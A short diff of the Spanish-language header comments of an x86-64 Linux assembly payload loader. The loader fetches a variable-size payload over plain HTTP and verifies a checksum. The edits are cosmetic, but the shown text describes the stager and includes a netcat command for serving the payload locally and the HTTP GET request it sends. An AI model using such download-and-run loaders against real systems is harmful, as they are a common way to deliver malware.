@@ -1,11 +1,11 @@
-;=============================================================================================================================================================
+;===============================================================================================================================================================
 ; Archivo      : payload-read-http-file-size-dynamic-checksum.asm
 ; Creado       : 15/02/2025
 ; Modificado   : 15/02/2025
 ; Autor        : Gastón M. González
 ; Plataforma   : Linux
 ; Arquitectura : x86-64
-; Descripción  : Loader de payload HTTP (no HTTPS), con payload de tamaño variable, sin límite de tamaño (prefijado en el código) y verificación de checksum
+; Descripción  : Loader de payload HTTP (no HTTPS), con payload de tamaño variable, sin límite de tamaño (predefinido en el código) y verificación de checksum
 ;                Descarga un payload con información adicional:
 ;                • Checksum global aditivo sobre el payload (3 bytes, en little endian).
 ;                • Longitud del payload (3 bytes, en little endian).
@@ -25,7 +25,7 @@
 ; Ejecutar     : ./payload-read-http-file-size-dynamic-checksum
 ; Ejecutar     : ./payload-read-http-file-size-dynamic-checksum ; echo "Código de salida:" $?
 ;
-;=============================================================================================================================================================
+;===============================================================================================================================================================
 ; Para probarlo en local se deben hacer los siguientes cambios:
 ;
 ;        http_get db "GET /bin/payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
@@ -46,7 +46,7 @@
 ; nc -l -p 8000 < payload.bin
 ;
 ; En la otra terminal ejecutamos el programa
-;=============================================================================================================================================================
+;===============================================================================================================================================================
 
 section .rodata
     http_get db "GET /bin/payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
